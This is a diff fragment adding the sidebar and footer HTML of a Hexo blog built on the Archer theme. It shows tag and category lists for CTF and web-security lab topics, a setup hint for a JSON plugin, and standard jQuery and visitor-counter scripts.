+        <span class="sidebar-tag-name" data-tags="工具使用"><span class="iconfont-archer">&#xe606;</span>工具使用</span>
+    
+        <span class="sidebar-tag-name" data-tags="DVWA"><span class="iconfont-archer">&#xe606;</span>DVWA</span>
+    
+        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="bugku"><span class="iconfont-archer">&#xe606;</span>bugku</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF比赛"><span class="iconfont-archer">&#xe606;</span>CTF比赛</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="知识普及"><span class="iconfont-archer">&#xe60a;</span>知识普及</span>
+    
+        <span class="sidebar-category-name" data-categories="功防世界"><span class="iconfont-archer">&#xe60a;</span>功防世界</span>
+    
+        <span class="sidebar-category-name" data-categories="小问题"><span class="iconfont-archer">&#xe60a;</span>小问题</span>
+    
+        <span class="sidebar-category-name" data-categories="工具使用"><span class="iconfont-archer">&#xe60a;</span>工具使用</span>
+    
+        <span class="sidebar-category-name" data-categories="DVWA"><span class="iconfont-archer">&#xe60a;</span>DVWA</span>
+    
+        <span class="sidebar-category-name" data-categories="sql-lab"><span class="iconfont-archer">&#xe60a;</span>sql-lab</span>
+    
+        <span class="sidebar-category-name" data-categories="xss-lab"><span class="iconfont-archer">&#xe60a;</span>xss-lab</span>
+    
+        <span class="sidebar-category-name" data-categories="upload-labs"><span class="iconfont-archer">&#xe60a;</span>upload-labs</span>
+    
+        <span class="sidebar-category-name" data-categories="bugku"><span class="iconfont-archer">&#xe60a;</span>bugku</span>
+    
+        <span class="sidebar-category-name" data-categories="CTF比赛"><span class="iconfont-archer">&#xe60a;</span>CTF比赛</span>
+    
+        <span class="sidebar-category-name" data-categories="SSRF"><span class="iconfont-archer">&#xe60a;</span>SSRF</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "JOe KKK"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
